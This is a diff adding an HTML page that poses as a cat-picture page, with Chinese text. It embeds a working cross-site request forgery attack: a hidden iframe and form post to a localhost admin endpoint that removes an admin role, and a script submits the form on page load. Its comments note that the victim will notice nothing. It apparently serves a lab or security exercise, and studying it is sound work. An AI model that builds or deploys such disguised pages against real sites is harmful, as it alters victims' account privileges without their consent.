@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>有趣的貓咪圖片</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; }
+        h1 { color: #333; }
+        img { max-width: 500px; margin: 20px auto; border-radius: 10px; }
+    </style>
+</head>
+<body>
+    <h1>可愛貓咪圖片</h1>
+    <img src="https://placekitten.com/500/300" alt="可愛的貓">
+    
+    <!-- 隱藏的表單 - 攻擊代碼 -->
+    <iframe style="display:none" name="csrf-frame"></iframe>
+    <form id="csrf-form" action="http://127.0.0.1:5000/admin-panel/admin/remove-admin-role/2" method="POST" target="csrf-frame">
+    </form>
+    
+    <script>
+        // 頁面載入後自動提交表單，無需使用者操作
+        window.onload = function() {
+            document.getElementById('csrf-form').submit();
+            // 用戶不會注意到有任何異常發生
+        }
+    </script>
+    
+    <p>這隻貓咪真可愛，對吧？</p>
+    <p>點擊下方查看更多貓咪圖片！</p>
+    <button onclick="window.location.href='https://placekitten.com'">更多貓咪</button>
+</body>
+</html>
